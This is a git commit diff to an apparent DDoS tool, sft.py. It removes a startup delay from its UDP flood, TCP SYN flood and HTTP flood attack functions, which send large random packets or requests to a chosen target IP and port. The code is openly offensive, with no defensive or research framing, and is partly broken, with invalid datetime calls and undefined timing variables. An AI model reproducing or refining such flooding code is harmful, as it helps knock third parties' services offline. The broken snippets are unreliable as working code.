4ac5234255345e85a2b523c7eaaf2cb9c43104a7
KunFay99 <kaffayukiffu@gmail.com>
2026-02-03 09:14:49 +0700

    Remove sleep delay from attack functions
    Removed initial sleep delay from UDP, TCP SYN, and HTTP flood attack functions.

--- sft.py
+++ sft.py
@@ -64,7 +64,6 @@ def udp_attack(target_ip, target_port, duration):
     packet_data = random._urandom(65500)
     datetime.datetime.now().total_seconds() + duration
     packets_sent = 0
-    time.sleep(1)
     print("{Fore.LIGHTYELLOW_EX}[{Fore.LIGHTRED_EX}sft'B4{Fore.LIGHTYELLOW_EX}]{Fore.LIGHTBLUE_EX} UDP attack has on {Fore.LIGHTGREEN_EX}{target_ip}:{target_port} {Fore.LIGHTBLUE_EX}duration {Fore.LIGHTGREEN_EX}{duration}")
     
     while time.time() < total_seconds:
@@ -76,7 +75,6 @@ def tcp_syn_attack(target_ip, target_port, duration):
     # Memulai serangan TCP SYN pada target yang ditentukan.
     datetime.datetime.now().total_seconds() + duration
     packets_sent = 0
-    time.sleep(1)
     print(f"{Fore.LIGHTYELLOW_EX}[{Fore.LIGHTRED_EX}sft'B4{Fore.LIGHTYELLOW_EX}]{Fore.LIGHTBLUE_EX} TCP SYN attack on {Fore.LIGHTGREEN_EX}{target_ip}:{target_port} {Fore.LIGHTBLUE_EX}duration {Fore.LIGHTGREEN_EX}{duration}")
 
     while time.time() < total_second:
@@ -93,7 +91,6 @@ async def http_flood_attack(target_ip, target_port, duration):
     # Melakukan serangan HTTP Flood pada target yang ditentukan.
     datetime.datetime.now().total_seconds() + duration
     requests_sent = 0
-    time.sleep(1)
     print(f"{Fore.LIGHTYELLOW_EX}[{Fore.LIGHTRED_EX}sft'B4{Fore.LIGHTYELLOW_EX}]{Fore.LIGHTBLUE_EX} HTTP Flood attack started on {Fore.LIGHTGREEN_EX}{target_ip}:{target_port} {Fore.LIGHTBLUE_EX}duration {Fore.LIGHTGREEN_EX}{duration}")
 
     async with aiohttp.ClientSession() as session:
